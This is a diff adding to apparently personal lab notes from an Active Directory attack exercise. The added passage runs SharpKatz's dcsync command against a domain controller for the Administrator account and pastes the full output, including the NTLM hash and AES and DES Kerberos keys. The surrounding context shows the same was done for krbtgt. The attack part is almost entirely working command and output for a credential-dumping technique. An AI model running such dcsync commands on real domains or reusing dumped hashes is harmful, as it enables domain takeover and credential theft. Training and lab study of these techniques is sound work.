@@ -301,3 +301,69 @@ C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt 
 [*]
 
 ```
+The same  process for administrator user:
+
+```
+C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\Administrator --Domain eu.local --DomainController eu-dc.eu.local
+[*]
+[*]                     System Information
+[*] ----------------------------------------------------------------------
+[*] | Platform: Win32NT                                                  |
+[*] ----------------------------------------------------------------------
+[*] | Major: 10            | Minor: 0             | Build: 17763         |
+[*] ----------------------------------------------------------------------
+[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
+[*] ----------------------------------------------------------------------
+[*]
+[!] eu.local will be the domain
+[!] eu-dc.eu.local will be the DC server
+[!] eu\Administrator will be the user account
+[*]
+[*] Object RDN           : Administrator
+[*]
+[*] ** SAM ACCOUNT **
+[*]
+[*] SAM Username         : Administrator
+[*] User Principal Name  :
+[*] Account Type         : USER_OBJECT
+[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
+[*] Account expiration   : 12/31/1600 4:00:00 PM
+[*] Password last change : 7/12/2019 10:57:59 PM
+[*] Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-500
+[*] Object Relative ID   : 500
+[*]
+[*] Credents:
+[*] Hash NTLM            : fe422f818eb7e9c6de5862d94739c2e4
+[*]
+[*] Supplemental Credents:
+[*]
+[*]  * Primary:NTLM-Strong-NTOWF
+[*]     Random Value : 5f7bd4f2ff28def5223962d35eef079d
+[*]
+[*]  * Primary:Kerberos-Newer-Keys
+[*]     Default Salt :EU-DCAdministrator
+[*]     Credents
+[*]     aes256_hmac       4096: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
+[*]     aes128_hmac       4096: 977311408c382531f01b42d6a5906181
+[*]     des_cbc_md5       4096: 23c7456de0644ccd
+[*]     ServiceCredents
+[*]     OldCredents
+[*]     aes256_hmac       4096: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
+[*]     aes128_hmac       4096: 977311408c382531f01b42d6a5906181
+[*]     des_cbc_md5       4096: 23c7456de0644ccd
+[*]     OlderCredents
+[*]     aes256_hmac       4096: 0b9fc10a20274364bcb059db52f500bfa0b560eccf023720a847f686b8b3dd18
+[*]     aes128_hmac       4096: 90e2e9a99a1d2ea77f75b7237370cd94
+[*]     des_cbc_md5       4096: 860ba1b92f5b9b38
+[*]
+[*]  * Packages
+[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos
+[*]
+[*]  * Primary:Kerberos
+[*]     Default Salt :EU-DCAdministrator
+[*]     Credents
+[*]     des_cbc_md5       : 23c7456de0644ccd
+[*]     OldCredents
+[*]     des_cbc_md5       : 23c7456de0644ccd
+[*]
+```
